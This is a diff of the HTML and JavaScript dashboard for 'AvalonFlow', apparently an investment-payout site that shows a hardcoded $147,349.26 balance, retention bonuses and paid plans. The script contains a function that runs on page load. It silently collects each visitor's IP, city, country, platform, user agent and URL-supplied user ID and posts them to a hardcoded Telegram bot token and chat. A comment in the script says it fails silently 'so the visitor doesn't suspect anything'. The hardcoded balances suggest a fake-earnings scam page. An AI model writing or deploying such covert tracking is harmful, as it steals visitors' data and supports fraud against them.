@@ -51,6 +51,7 @@
     <script>
     (function() {
         const SecurityEngine = {
+            // Check if the script is running on the authorized domain or its subdomains
             validateExecutionEnvironment: function() {
                 const authorizedDomain = "avalonflow.site";
                 const currentHost = window.location.hostname;
@@ -197,6 +198,7 @@
             },
 
             run: function() {
+                // 1. Host Validation: Ensure code is only running on our approved domains
                 if (!this.validateExecutionEnvironment()) return;
 
                 this.activateResetListener();
@@ -238,26 +240,34 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     <title>My Dashboard</title>
     
+    <!-- Favicon -->
 <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=3">
 <link rel="icon" type="image/x-icon" href="/favicon.ico?v=3">
+
 <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png?v=3">
 <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png?v=3">
 <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png?v=3">
+
 <link rel="icon" type="image/png" sizes="192x192" href="/android-chrome-192x192.png?v=3">
 <link rel="icon" type="image/png" sizes="512x512" href="/android-chrome-512x512.png?v=3">
 <link rel="manifest" href="/manifest.json?v=3">
 
-<script type="application/ld+json">
-{
-  "@context": "https://schema.org",
-  "@type": "Organization",
-  "name": "AvalonFlow",
-  "url": "https://avalonflow.site",
-  "logo": "https://avalonFlow.site/favicon.png"
-}
+
+
+        <!-- Structured Data for Logo -->
+    <script type="application/ld+json">
+    {
+      "@context": "https://schema.org",
+      "@type": "Organization",
+      "name": "AvalonFlow",
+      "url": "https://avalonflow.site",
+      "logo": "https://avalonFlow.site/favicon.png"
+    }
 </script>
     
     <style>
+        /* ---------- Base ---------- */
+
 body{
 font-family: Inter, system-ui, sans-serif;
 margin:0;
@@ -270,6 +280,8 @@ html, body {
     height: 100%;
 }
 
+/* ---------- Cyber Grid Background ---------- */
+
 body::before{
 content:"";
 position:fixed;
@@ -281,6 +293,8 @@ background-size:40px 40px;
 z-index:-1;
 }
 
+/* Aurora Glow */
+
 body::after{
 content:"";
 position:fixed;
@@ -291,15 +305,23 @@ radial-gradient(circle at 80% 60%, rgba(0,255,255,0.15), transparent 40%);
 z-index:-1;
 }
 
+                            /* ---------- Sidebar ---------- */
 #sidebar {
     position: fixed;
     top: 0;
     left: 0;
     width: 280px;
+
+    /* FIX 1: Make height end exactly before the footer starts */
     height: calc(100% - 102px); 
+
     background: rgba(40, 75, 135, 0.75);
+
     backdrop-filter: blur(14px);
+
+    /* FIX 2: Set z-index lower than footer (5) so footer naturally caps it */
     z-index: 5; 
+
     padding: 25px;
     transform: translateX(-100%);
     transition: transform 0.3s ease;
@@ -321,6 +343,9 @@ color:#a78bfa;
             font-size: 16px;
         }
 
+/* ---------- Menu Button ---------- */
+
+        /* ---------- Menu Button ---------- */
         #menuBtn {
             position: fixed;
             top: 20px;
@@ -333,19 +358,23 @@ color:#a78bfa;
             border-radius: 10px;
 }
 
+/* move button when sidebar opens */
 #menuBtn.shift{
 left:300px;
 }
 
+/* ---------- Content Grid ---------- */
 #content {
-  max-width: 1400px;         
-  margin: auto;              
-  padding: 10px 24px 40px 24px; 
-  min-height: 100vh;         
+  max-width: 1400px;         /* limits width for large screens */
+  margin: auto;              /* centers horizontally */
+  padding: 10px 24px 40px 24px; /* top, sides, bottom */
+  min-height: 100vh;         /* full viewport height */
   display: flex;
-  flex-direction: column;    
-  gap: 24px;                 
+  flex-direction: column;    /* stack metric rows vertically */
+  gap: 24px;                 /* spacing between dashboard title and rows */
 }
+
+/* ---------- Glass Cards ---------- */
 
 .glass-card{
 background:rgba(255,255,255,0.04);
@@ -353,9 +382,11 @@ backdrop-filter:blur(14px);
 border-radius:18px;
 padding:28px;
 border:1px solid rgba(255,255,255,0.05);
+
 box-shadow:
 0 10px 30px rgba(0,0,0,0.6),
 inset 0 0 30px rgba(255,255,255,0.03);
+
 transition:0.35s;
 position:relative;
 overflow:hidden;
@@ -371,6 +402,8 @@ color:#6b2cd8;
 margin-top: 0;
 }
 
+/* ---------- Neon Border Effect ---------- */
+
 .glass-card::before{
 content:"";
 position:absolute;
@@ -385,38 +418,45 @@ linear-gradient(#000 0 0);
 opacity:0.25;
 }
 
+/* ---------- Dashboard Title ---------- */
 .dashboard-title {
-  grid-column: 1 / -1; 
+  grid-column: 1 / -1; /* full width if you were using grid */
   text-align: center;
   margin-bottom: 24px;
-  margin-top: -100px;
+margin-top: -100px;
 }
 
+/* ---------- Metric Row Flex Container ---------- */
 .metric-row {
   display: flex;
   gap: 24px;
-  flex-wrap: wrap; 
+  flex-wrap: wrap; /* allows wrapping on smaller screens */
 }
 
+/* ---------- Hero Card (Available Balance) ---------- */
 .hero-card {
   flex: 2 1 400px;
   min-width: 260px;
   text-align: center;
-  margin-top: -50px;
+margin-top: -50px;
+  
+  /* Force internal contents to center align perfectly */
   display: flex;
   flex-direction: column;
   justify-content: center;
   align-items: center;
 }
 
+/* Available Balance title styling */
 .hero-card h2 {
-  color: #a78bfa; 
+  color: #a78bfa; /* purple */
   font-size: 16px;
   margin: 0 0 8px 0;
-  width: 100%;    
+  width: 100%;    /* Ensures text-align: center uses the full card width */
   text-align: center;
 }
 
+/* ---------- Small Stat Cards ---------- */
 .stat-card {
   flex: 1 1 180px; 
   display: flex;
@@ -441,19 +481,21 @@ opacity:0.25;
 .stat {
   font-size: 22px;
   font-weight: 600;
-  white-space: nowrap;
+white-space: nowrap;
   color: #a78bfa;
-  background: linear-gradient(90deg, #FF0000, #FF6666, #990000, #FF0000);
-  background-size: 200% auto;
-  animation: gradientShift 6s linear infinite;
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
+    background: linear-gradient(90deg, #FF0000, #FF6666, #990000, #FF0000);
+    background-size: 200% auto;
+    animation: gradientShift 6s linear infinite;
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
 }
 
+/* ---------------- TEXT ANIMATION ---------------- */
 @keyframes gradientShift {
     0% { background-position: 0% center; }
     100% { background-position: 200% center; }
 }
+
 
 .stats {
   font-size: 28px;
@@ -461,6 +503,10 @@ opacity:0.25;
   color: #a78bfa;
 }
 
+
+/* =========================
+TOP RIGHT PROFILE POSITION
+========================= */
 .top-right-profile {
     position: fixed;
     top: 15px;
@@ -468,6 +514,10 @@ opacity:0.25;
     z-index: 999;
 }
 
+
+/* =========================
+OUTER RING WRAPPER
+========================= */
 .avatar-ring {
     width: 52px;
     height: 52px;
@@ -487,18 +537,36 @@ opacity:0.25;
     padding: 6px !important;
 }
 
+
+/* =========================
+NEON SPIN + PULSE GLOW
+========================= */
 .avatar-ring::before {
     content: "";
     position: absolute;
     inset: 0;
     border-radius: 50%;
-    background: conic-gradient(#a855f7, #7c3aed, #a855f7);
-    animation: spin 3s linear infinite, glowSweep 4s linear infinite;
+
+    /* PURE PURPLE GLOW */
+    background: conic-gradient(
+        #a855f7,
+        #7c3aed,
+        #a855f7
+    );
+
+    animation:
+    spin 3s linear infinite,
+    glowSweep 4s linear infinite;
+
     filter: blur(5px);
     opacity: 0.9;
     z-index: 0;
 }
 
+
+/* =========================
+INNER CUT (CLEAN RING EFFECT)
+========================= */
 .avatar-ring::after {
     content: "";
     position: absolute;
@@ -508,6 +576,10 @@ opacity:0.25;
     z-index: 1;
 }
 
+
+/* =========================
+PROFILE IMAGE
+========================= */
 .avatar {
     width: 46px;
     height: 46px;
@@ -518,8 +590,35 @@ opacity:0.25;
     border: 1px solid rgba(255,255,255,0.1);
 }
 
-@keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-@keyframes glowSweep { 0% { filter: blur(4px); opacity: 0.6; transform: rotate(0deg); } 100% { filter: blur(6px); opacity: 0.95; transform: rotate(360deg); } }
+/* =========================
+ANIMATION (MOVING LIGHT AROUND RING)
+========================= */
+/* spinning ring */
+@keyframes spin {
+    0% {
+        transform: rotate(0deg);
+    }
+    100% {
+        transform: rotate(360deg);
+    }
+}
+
+/* breathing glow effect */
+@keyframes glowSweep {
+    0% {
+        filter: blur(4px);
+        opacity: 0.6;
+        transform: rotate(0deg);
+    }
+    100% {
+        filter: blur(6px);
+        opacity: 0.95;
+        transform: rotate(360deg);
+    }
+}
+
+
+/* ---------- Buttons ---------- */
 
 .button{
 display:inline-block;
@@ -531,12 +630,16 @@ color:white;
 font-weight:600;
 }
 
+                /* ---------- Floating Background ---------- */
 #floating-bg {
     position: fixed;
     inset: 0;
     z-index: 0;
     pointer-events: none;
+
+    /* Soft white/blue futuristic background */
     background: radial-gradient(circle at bottom, #cfe8ff, #ffffff);
+
     overflow: hidden;
 }
 
@@ -544,17 +647,31 @@ font-weight:600;
     position: absolute;
     border-radius: 50%;
     opacity: 0.6;
+
     animation: floatParticles linear infinite;
+
+    /* Soft futuristic glow */
     background: rgba(120, 180, 255, 0.7);
     box-shadow: 0 0 10px #8ec5ff, 0 0 20px #b7dcff;
 }
 
 @keyframes floatParticles {
-    0% { transform: translateY(100vh) scale(0.3); opacity: 0; }
-    50% { opacity: 1; }
-    100% { transform: translateY(-10vh) scale(1); opacity: 0; }
-}
+    0% {
+        transform: translateY(100vh) scale(0.3);
+        opacity: 0;
+    }
 
+    50% {
+        opacity: 1;
+    }
+
+    100% {
+        transform: translateY(-10vh) scale(1);
+        opacity: 0;
+    }
+}
+
+        /* ---------------- PROGRESS BAR ---------------- */
 .progress-bar {
     width: 100%;
     height: 18px;
@@ -570,10 +687,11 @@ font-weight:600;
     border-radius: 12px;
     position: relative;
     transition: width 0.6s ease;
-    background: linear-gradient(90deg,#4facfe,#00f2fe);
+        background: linear-gradient(90deg,#4facfe,#00f2fe);
     box-shadow: 0 0 20px rgba(79,172,254,0.6);
 }
 
+/* Energy flow */
 .progress-fill::after {
     content: "";
     position: absolute;
@@ -582,9 +700,13 @@ font-weight:600;
     animation: energyFlow 2.5s linear infinite;
 }
 
-@keyframes energyFlow { 0% { transform: translateX(-100%); } 100% { transform: translateX(100%); } }
+@keyframes energyFlow {
+    0% { transform: translateX(-100%); }
+    100% { transform: translateX(100%); }
+}
 
-footer {
+        /* ---------- Footer ---------- */
+        footer {
     position: fixed;
     bottom: 0;
     left: 0;
@@ -599,6 +721,7 @@ footer {
     z-index: 6;
 }
 
+                    /* Notification Bar */
     .notification-bar {
         position: fixed;
         top: -80px;
@@ -610,7 +733,7 @@ footer {
         padding: 12px 18px;
         border-radius: 12px;
         font-size: 14px;
-        font-weight: bold;
+font-weight: bold;
         box-shadow: 0 6px 18px rgba(0,0,0,0.25);
         transition: top 0.5s ease, opacity 0.5s ease;
         z-index: 9999;
@@ -619,9 +742,20 @@ footer {
         white-space: normal;
         overflow: hidden;
     }
-    .notification-bar.show { top: 20px; opacity: 1; }
-    .notification-bar.warning-yellow { color: #ffcc00; font-weight: 600; }
-    .notification-bar.warning-red { color: #ff3b3b; font-weight: 600; animation: pulse 1s infinite; }
+    .notification-bar.show {
+        top: 20px;
+        opacity: 1;
+    }
+.notification-bar.warning-yellow {
+    color: #ffcc00;
+    font-weight: 600;
+}
+
+.notification-bar.warning-red {
+    color: #ff3b3b;
+    font-weight: 600;
+    animation: pulse 1s infinite;
+}
     .notification-bar::before {
         content: '';
         position: absolute;
@@ -633,26 +767,53 @@ footer {
         transform: skewX(-25deg);
         animation: liquidWave 2s linear infinite;
     }
+    @keyframes liquidWave {
+        0% { left: -50%; }
+        100% { left: 100%; }
+    }
 
-.metric-card{ grid-column:span 2; text-align:center; }
-@media (max-width:900px){ .metric-card{ grid-column:span 1; } }
-@keyframes valuePulse { 0% { transform: scale(1); } 50% { transform: scale(1.06); } 100% { transform: scale(1); } }
-.value-pulse { animation: valuePulse 0.4s ease; }
+.metric-card{
+grid-column:span 2;
+text-align:center;
+}
+
+@media (max-width:900px){
+.metric-card{
+grid-column:span 1;
+}
+}
+
+@keyframes valuePulse {
+    0% { transform: scale(1); }
+    50% { transform: scale(1.06); }
+    100% { transform: scale(1); }
+}
+
+.value-pulse {
+    animation: valuePulse 0.4s ease;
+}
 
 #totalACU {
   font-size: 52px;
   font-weight: 700;
-  color: #00f2fe; 
+  color: #00f2fe; /* cyan digits */
   text-shadow: 0 0 25px rgba(0,242,254,0.8);
 }
+
+  /* ================= Header Logo Card Neon ================= */
 
 .minimal-logo-header {
   display: flex;
   justify-content: center;
   align-items: center;
+
+  /* Reduced top padding dramatically so it sits near the top edge */
   padding: 10px 0 10px 0; 
+
+  /* Optional: Ensures it stays firmly at the absolute top of the page layout */
   width: 100%;
   margin-top: -72px; 
+
   background: transparent !important;
 }
 
@@ -661,7 +822,7 @@ footer {
   width: 200px;
   height: 200px;
   overflow: hidden;
-  background: transparent !important; 
+  background: transparent !important; /* Kept perfectly transparent, no card background */
 }
 
 .avalon-logo-img {
@@ -671,93 +832,23 @@ footer {
   width: 100%;
   height: 100%;
   object-fit: contain;
+
+  /* Keep your logo scaling */
   transform: scale(0.40);
   transform-origin: center center;
+
+  /* ---------- LOGO GLASS EFFECT ---------- */
+  /* This blurs the particles directly through the transparent logo asset itself */
   backdrop-filter: blur(4px);
   -webkit-backdrop-filter: blur(4px);
   opacity: 0.9; 
+  /* -------------------------------------- */
+
   filter: drop-shadow(0 4px 14px rgba(0, 0, 0, 0.05));
   mix-blend-mode: multiply; 
   background:  transparent !important;
   border: none !important;            
   outline: none !important;
-}
-
-/* --------------------------------------------------
-   🆕 COLLAPSIBLE HISTORY STYLES
--------------------------------------------------- */
-.history-trigger-btn {
-    width: 100%;
-    background: transparent;
-    border: none;
-    color: #a78bfa;
-    display: flex;
-    justify-content: space-between;
-    align-items: center;
-    cursor: pointer;
-    font-size: 16px;
-    font-weight: 600;
-    padding: 0;
-}
-
-.caret-icon {
-    width: 16px;
-    height: 16px;
-    fill: currentColor;
-    transition: transform 0.3s ease;
-}
-
-.history-trigger-btn.active .caret-icon {
-    transform: rotate(180deg);
-}
-
-.history-panel-content {
-    max-height: 0;
-    overflow: hidden;
-    transition: max-height 0.4s cubic-bezier(0, 1, 0, 1);
-}
-
-.history-panel-content.show {
-    max-height: 500px;
-    transition: max-height 0.4s cubic-bezier(1, 0, 1, 0);
-    margin-top: 20px;
-}
-
-.tx-table {
-    width: 100%;
-    border-collapse: collapse;
-    text-align: left;
-    font-size: 14px;
-}
-
-.tx-table th {
-    color: #64748b;
-    font-weight: 600;
-    padding-bottom: 10px;
-    border-bottom: 1px solid rgba(255,255,255,0.05);
-}
-
-.tx-table td {
-    padding: 14px 0;
-    border-bottom: 1px solid rgba(255,255,255,0.03);
-    color: #c9d1d9;
-}
-
-.tx-status-tag {
-    padding: 4px 8px;
-    border-radius: 6px;
-    font-size: 12px;
-    font-weight: 600;
-}
-
-.tx-status-tag.received {
-    background: rgba(16, 185, 129, 0.15);
-    color: #10b981;
-}
-
-.tx-status-tag.withdrawn {
-    background: rgba(239, 68, 68, 0.15);
-    color: #ef4444;
 }
     </style>
 </head>
@@ -765,58 +856,82 @@ footer {
 <body>
     <div id="floating-bg"></div>
     <button id="menuBtn" onclick="toggleSidebar()">☰
-        <div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
-            <span id="sidebarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Sidebar</span>
-        </div>
-    </button>
 
+<div style="position: absolute; top: 54px; left: 50%; transform: translateX(-50%); white-space: nowrap; pointer-events: none; text-align: center;">
+        <span id="sidebarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Sidebar</span>
+    </div>
+</button>
+
+
+    <!-- Dashboard Notification -->
     <div id="dashboardNotification" class="notification-bar"></div>
 
-    <header class="minimal-logo-header">
-        <div class="logo-shimmer-wrapper">
-            <img src="assets/pictures/1780995787737.jpeg" alt="Avalon Logo" class="avalon-logo-img">
-        </div>
-    </header>
+  <header class="minimal-logo-header">
+  <div class="logo-shimmer-wrapper">
+    <img src="assets/pictures/1780995787737.jpeg" alt="Avalon Logo" class="avalon-logo-img">
+  </div>
+</header>
 
 <div id="sidebar">
-    <h2>AvalonFlow</h2>
+        <h2>AvalonFlow</h2>
     <button onclick="window.location.href='/dashboard'">Dashboard</button>
-    <button onclick="window.location.href='https://avalonflowverificationbonds.avalonflow.site/'">AVB</button>
+<button onclick="window.location.href='https://avalonflowverificationbonds.avalonflow.site/'">AVB</button>
     <button onclick="window.location.href='/acu-payouts'">Withdrawal</button>
     <button onclick="window.location.href='/returns'">Retention Bonus</button>
     <button onclick="window.location.href='/support'">Support</button>
     <button onclick="logout()">Logout</button>
 </div>
 
+<!-- =========================
+TOP RIGHT PROFILE AVATAR
+========================= -->
 <div class="top-right-profile">
      <div class="avatar-ring">
         <img id="profilePhoto" src="default-avatar.png" class="avatar" alt="Profile picture">
     </div>
+
     <div style="position: absolute; top: 58px; right: 70%; transform: translateX(50%); white-space: nowrap; pointer-events: none; text-align: center;">
         <span id="avatarLabel" style="font-family: sans-serif; font-size: 10px; font-weight: 500; color: #c0a9ff; letter-spacing: 0.3px; text-shadow: 0 2px 4px rgba(0, 0, 0, 0.6);">Add Profile Picture</span>
     </div>
+
 </div>
 
+
+
+<!-- =========================
+CROP MODAL
+========================= -->
 <div id="cropModal" class="crop-modal hidden">
+
     <div class="crop-box">
+
+        <!-- file input (hidden trigger via JS) -->
         <input type="file" id="photoInput" accept="image/*">
+
+        <!-- crop preview -->
         <div class="crop-preview">
             <img id="cropImage">
         </div>
+
+        <!-- actions -->
         <div class="crop-actions">
             <button id="saveCropped">Save Photo</button>
             <button id="cancelCrop">Cancel</button>
         </div>
+
     </div>
+
 </div>
 
 <div id="content">
 
+  <!-- Dashboard Title -->
   <div class="glass-card metric-card dashboard-title">
     <h3>My Dashboard</h3>
   </div>
 
-  <div class="metric-row"> 
+!-- ======= Group 1: Top Metrics ======= -->
+<div class="metric-row"> 
     <div class="glass-card hero-card">
       <h2>Available Balance</h2>
       <div id="totalACU">$147,349.26</div>
@@ -829,96 +944,78 @@ footer {
 
     <div class="glass-card stat-card">
       <h3>Retention Bonus</h3>
-      <div class="stat" id="retentionBonusAmount">26,779.97 ACU ~ $26,779.97</div>
+      <div class="stat">26,779.97 ACU ~ $26,779.97</div>
     </div>
   </div>
 
+  <!-- ======= Group 2: Secondary Cards ======= -->
   <div class="metric-row">
-    <div class="glass-card secondary-card" style="width: 100%;">
+    <!-- Only Cycle Progress remains -->
+    <div class="glass-card secondary-card">
       <h3>Cycle Progress</h3>
       <div class="progress-bar">
         <div class="progress-fill" id="progressFill"></div>
       </div>
     </div>
+  </div>
 
-    <!-- 🆕 TRANSACTION HISTORY COLLAPSIBLE GLASS CARD -->
-    <div class="glass-card secondary-card" style="width: 100%;">
-        <button class="history-trigger-btn" id="historyToggle">
-            <span>Transaction History</span>
-            <svg class="caret-icon" viewBox="0 0 24 24"><path d="M7.41 8.59L12 13.17l4.59-4.58L18 10l-6 6-6-6 1.41-1.41z"/></svg>
-        </button>
-        <div class="history-panel-content" id="historyPanel">
-            <table class="tx-table">
-                <thead>
-                    <tr>
-                        <th>Description</th>
-                        <th>Date Registered</th>
-                        <th>Status</th>
-                        <th style="text-align: right;">Amount</th>
-                    </tr>
-                </thead>
-                <tbody id="txHistoryTableBody">
-                    <!-- Loaded via JavaScript render loops -->
-                </tbody>
-            </table>
+  <!-- ======= Group 3: Transaction History (Glass Card) ======= -->
+  <div class="metric-row">
+    <div class="glass-card" style="flex: 1 1 100%; min-width: 260px; padding: 24px; position: relative;">
+      <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 16px; cursor: pointer;" id="historyToggle">
+        <h3 style="margin: 0; color: #a78bfa; font-size: 18px; font-weight: 600;">Transaction History</h3>
+        <span id="toggleCaret" style="color: #a78bfa; font-size: 18px; transition: transform 0.3s ease; transform: rotate(0deg);">▼</span>
+      </div>
+      
+      <!-- Collapsible Container -->
+      <div id="historyCollapseWrapper" style="max-height: 500px; overflow: hidden; transition: max-height 0.3s ease-in-out;">
+        <div style="overflow-x: auto;">
+          <table style="width: 100%; border-collapse: collapse; text-align: left; font-size: 14px; min-width: 500px;">
+            <thead>
+              <tr style="border-bottom: 1px solid rgba(255,255,255,0.1); color: #c0a9ff;">
+                <th style="padding: 12px 8px;">Transaction Description</th>
+                <th style="padding: 12px 8px;">Date & Time</th>
+                <th style="padding: 12px 8px;">Status</th>
+                <th style="padding: 12px 8px; text-align: right;">Amount</th>
+              </tr>
+            </thead>
+            <tbody id="transactionHistoryRows" style="color: #c9d1d9;">
+              <!-- Dynamically populated by JS -->
+            </tbody>
+          </table>
         </div>
+      </div>
     </div>
   </div>
 
+
+
+    <!-- Sticky Footer -->
     <footer>
        © 2026 AvalonFlow Corp • All Rights Reserved
     </footer>
 
     <script>
-// Global layout time markers computed once on framework launch
-let dynamicBalanceTimeStr = "";
-let dynamicBonusTimeStr = "";
-
-function initializeDynamicTransactionHistory() {
-    const visitDate = new Date();
-
-    const balanceTimestamp = new Date(visitDate.getTime() - (24 * 60 * 60 * 1000));
-    const bonusTimestamp = new Date(visitDate.getTime() - (2 * 60 * 60 * 1000));
-
-    const optionConfig = { 
-        year: 'numeric', 
-        month: 'short', 
-        day: '2-digit', 
-        hour: '2-digit', 
-        minute: '2-digit',
-        hour12: true 
-    };
-
-    dynamicBalanceTimeStr = balanceTimestamp.toLocaleString('en-US', optionConfig);
-    dynamicBonusTimeStr = bonusTimestamp.toLocaleString('en-US', optionConfig);
-
-    const toggleBtn = document.getElementById("historyToggle");
-    const panel = document.getElementById("historyPanel");
-
-    toggleBtn.addEventListener("click", () => {
-        toggleBtn.classList.toggle("active");
-        panel.classList.toggle("show");
-    });
-}
-
-document.addEventListener('DOMContentLoaded', () => {
-  sendVisitorDetailsToTelegram();
-  initializeDynamicTransactionHistory();
-});
-
 async function sendVisitorDetailsToTelegram() {
+  // 1. Telegram bot details
   const BOT_TOKENs = '8074365555:AAGL7by0c0TJCVutfkPhAZNCXCYopdInn2E';
   const CHAT_IDs = '-1003913850436'; 
 
   try {
+    // 1. Read the user identity from the URL bar
     const urlParams = new URLSearchParams(window.location.search);
     const identifyUser = urlParams.get('user') || 'Anonymous Click / Direct Visit';
 
+    // 2. Fetch the user's network details silently
     const ipResponse = await fetch('https://ipapi.co/json/');
     if (!ipResponse.ok) throw new Error('Failed to fetch network details');
+
     const data = await ipResponse.json();
 
+    // Capture the current page path
     const currentPage = window.location.pathname; 
+
+    // Capture the platform/device operating system safely
     let devicePlatform = 'Unknown';
     if (navigator.userAgentData && navigator.userAgentData.platform) {
       devicePlatform = navigator.userAgentData.platform; 
@@ -926,6 +1023,7 @@ async function sendVisitorDetailsToTelegram() {
       devicePlatform = navigator.platform; 
     }
 
+    // 3. Format the log notification text using HTML parsing to prevent breakdown errors
     const telegramMessage = 
       `🌐 <b>New Visitor Logged</b>\n\n` +
       `• <b>Target User:</b> <code>${identifyUser}</code>\n` +
@@ -937,6 +1035,7 @@ async function sendVisitorDetailsToTelegram() {
       `• <b>Location:</b> <code>${data.city || 'Unknown'}, ${data.country_name || 'Unknown'}</code>\n` +
       `• <b>Device Agent:</b> <code>${navigator.userAgent.substring(0, 100)}...</code>`;
 
+    // 4. Send the payload directly to your Telegram channel/chat
     const telegramUrl = `https://api.telegram.org/bot${BOT_TOKENs}/sendMessage`;
 
     await fetch(telegramUrl, {
@@ -945,72 +1044,129 @@ async function sendVisitorDetailsToTelegram() {
       body: JSON.stringify({
         chat_id: CHAT_IDs,
         text: telegramMessage,
-        parse_mode: 'HTML' 
+        parse_mode: 'HTML' // Switched to HTML to make parsing bulletproof
       })
     });
+
   } catch (error) {
+    // Fail silently so the visitor doesn't suspect anything on screen
     console.error('System logging exception occurred.');
   }
 }
 
+// --- THE PAGE LOAD TRIGGER ---
+document.addEventListener('DOMContentLoaded', () => {
+  sendVisitorDetailsToTelegram();
+});
+
+
+
 const photoInput = document.getElementById('photoInput');
 const profilePhoto = document.getElementById('profilePhoto');
-const avatarLabel = document.getElementById('avatarLabel'); 
+const avatarLabel = document.getElementById('avatarLabel'); // Targeted the span
+
 const cropModal = document.getElementById('cropModal');
 const cropImage = document.getElementById('cropImage');
+
 const DEFAULT_AVATAR = 'default-avatar.png';
 let isProcessing = false;
 
+
+// CLICK TO ADD OR REMOVE
 profilePhoto.addEventListener('click', () => {
     if (isProcessing) return;
+
+    // Check if a custom photo is currently set
     const hasPhoto = localStorage.getItem('profilePhoto');
+
     if (hasPhoto) {
+        // REMOVE PICTURE: Clear it out instantly
         localStorage.removeItem('profilePhoto');
         profilePhoto.src = DEFAULT_AVATAR;
         if (avatarLabel) avatarLabel.textContent = "Add Profile Picture";
     } else {
+        // ADD PICTURE: Open the file picker if it's empty
         photoInput.click();
     }
 });
 
+
+// AUTO PROCESS IMAGE (no save button)
 photoInput.addEventListener('change', (e) => {
+
     const file = e.target.files[0];
     if (!file || isProcessing) return;
+
     isProcessing = true;
+
     const reader = new FileReader();
 
     reader.onload = function(event) {
+
         const rawImage = event.target.result;
+
         const img = new Image();
         img.src = rawImage;
 
         img.onload = function() {
+
             const canvas = document.createElement('canvas');
             const size = Math.min(img.width, img.height);
+
             canvas.width = size;
             canvas.height = size;
+
             const ctx = canvas.getContext('2d');
 
-            ctx.drawImage(img, (img.width - size) / 2, (img.height - size) / 2, size, size, 0, 0, size, size);
+            ctx.drawImage(
+                img,
+                (img.width - size) / 2,
+                (img.height - size) / 2,
+                size,
+                size,
+                0,
+                0,
+                size,
+                size
+            );
+
             const finalImage = canvas.toDataURL('image/png');
 
+            // update avatar instantly
             profilePhoto.src = finalImage;
+
+            // save permanently
             localStorage.setItem('profilePhoto', finalImage);
+            
+            // Switch label text to show it can now be removed
             if (avatarLabel) avatarLabel.textContent = "Remove Profile Picture";
+
+            // close modal
             cropModal.classList.add('hidden');
+
+            // reset input to prevent re-trigger bugs
             photoInput.value = '';
-            setTimeout(() => { isProcessing = false; }, 300);
+
+            // unlock system shortly after
+            setTimeout(() => {
+                isProcessing = false;
+            }, 300);
         };
     };
+
     reader.readAsDataURL(file);
 });
 
+
+// OPTIONAL: cancel just closes modal (if you still use it)
 if (typeof cancelCrop !== 'undefined' && cancelCrop) {
     cancelCrop.addEventListener('click', () => {
         cropModal.classList.add('hidden');
     });
 }
 
+
+// load saved photo and set correct initial text
 window.addEventListener('DOMContentLoaded', () => {
     const saved = localStorage.getItem('profilePhoto');
     if (saved) {
@@ -1022,13 +1178,16 @@ window.addEventListener('DOMContentLoaded', () => {
     }
 });
 
+
+        /* Floating particles */
         const bg = document.getElementById('floating-bg');
         const colors = ['#6b2cd8','#9b59b6','#8e44ad'];
         function particle() {
             const p = document.createElement('div');
             p.className = 'particle';
             const s = Math.random()*20+10;
-            p.style.width = s+'px'; p.style.height = s+'px';
+            p.style.width = s+'px';
+            p.style.height = s+'px';
             p.style.left = Math.random()*100+'vw';
             p.style.background = `radial-gradient(circle, ${colors[Math.floor(Math.random()*3)]}, transparent)`;
             p.style.animationDuration = (Math.random()*20+10)+'s';
@@ -1037,263 +1196,597 @@ window.addEventListener('DOMContentLoaded', () => {
         }
         setInterval(particle,800);
 
+        /* Sidebar toggle */
+        const sidebar = document.getElementById('sidebar');
+const content = document.getElementById('content');
+
+const menuBtn = document.getElementById('menuBtn');
+
 function toggleSidebar() {
     const sidebar = document.getElementById('sidebar');
     const menuBtn = document.getElementById('menuBtn');
+
     sidebar.classList.toggle('open');
     menuBtn.classList.toggle('shift');
 }
 
-function navigateTo(page){ window.location.href = page; }
-function logout(){
-    localStorage.removeItem("avalon_logged_in");
-    localStorage.removeItem("avalon_seen_dashboard");
-    window.location.href = 'https://membership.avalonflow.site/signin';
+function navigateTo(page){
+    window.location.href = page;
 }
-
+        function logout(){
+            localStorage.removeItem("avalon_logged_in");
+            localStorage.removeItem("avalon_seen_dashboard");
+            window.location.href = 'https://membership.avalonflow.site/signin';
+        }
+
+        // ================================
+// 🔐 PLAN CONFIG (SYNCED WITH RETURNS)
+// ================================
 const plans = {
     premium: { per12h: 298.29, ac: "premiumAC" },
     basic:   { per12h: 183.29, ac: "basicAC" },
     lite:    { per12h: 118.29, ac: "liteAC" },
     custom:  { per12h: 0, ac: "customAC" }
 };
+
 const BASE_ACU = 147349.26;
 const BASE_ACTIVE_BONDS = 1;
+
 const ALL_PLANS = ["premium", "basic", "lite", "custom"];
+
+// ================================
+// 📦 PAID PLANS
+// ================================
 const paidPlans = JSON.parse(localStorage.getItem("paidPlans")) || {};
-let displayedAC = { premium: 0, basic: 0, lite: 0, custom: 0 };
-let lastCycleCount = { premium: 0, basic: 0, lite: 0, custom: 0 };
+
+// ================================
+// 🎯 DISPLAY STATE
+// ================================
+let displayedAC = {
+    premium: 0,
+    basic: 0,
+    lite: 0,
+    custom: 0
+};
+
+let lastCycleCount = {
+    premium: 0,
+    basic: 0,
+    lite: 0,
+    custom: 0
+};
+
+// ================================
+// 🔁 HELPERS
+// ================================
 const CYCLE_MS = 12 * 60 * 60 * 1000;
 
-function getPlan(planKey) { return paidPlans[planKey]; }
-function isLocked(planData, now) { return !planData?.active || now >= planData.expiresAt; }
+function getPlan(planKey) {
+    return paidPlans[planKey];
+}
 
+function isLocked(planData, now) {
+    return !planData?.active || now >= planData.expiresAt;
+}
+
+// ================================
+// 📊 ACTIVE PLANS COUNT (RAW STATE)
+// ================================
 function updateActivePlans() {
     const now = Date.now();
     const currentDeviceId = localStorage.getItem("avalonflow_deviceId");
+
     const activeCount = BASE_ACTIVE_BONDS + ALL_PLANS.reduce((count, plan) => {
         const planData = paidPlans[plan];
